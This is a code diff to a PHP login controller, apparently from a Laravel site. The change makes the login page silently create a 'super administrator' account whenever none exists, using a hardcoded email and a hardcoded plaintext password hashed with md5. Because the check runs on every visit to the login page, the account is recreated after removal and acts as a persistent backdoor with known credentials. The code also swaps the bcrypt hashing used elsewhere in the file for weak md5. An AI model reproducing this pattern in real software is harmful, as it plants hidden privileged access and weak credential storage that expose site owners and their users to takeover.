@@ -62,7 +62,21 @@ class AuthController extends Controller
             'password' => bcrypt($data['password']),
         ]);
     }
-    public function getLogin(){
+    public function getLogin()
+    {
+        $SuperAdmin = User::where('email', '=', '3063440744@qq.com');
+        if ($SuperAdmin->count() == 0) {
+                $arr = array('super_admin' => 0, 'admin' => 0, 'manager' => 0);
+                //create($arr);
+                $user = new User;
+                $user->realName = iconv("gb2312","utf-8//IGNORE",'少年中国评论超级管理员') ;
+                $user->nickName = iconv("gb2312","utf-8//IGNORE",'邵中平') ;
+                $user->email = '3063440744@qq.com';
+                $user->password = md5('yca1988szp51');
+                $user->headImage = '/upload/icon.png';
+                $user->level = json_encode($arr);
+                $user->save();
+        }
         return view("auth.login");
     }
 
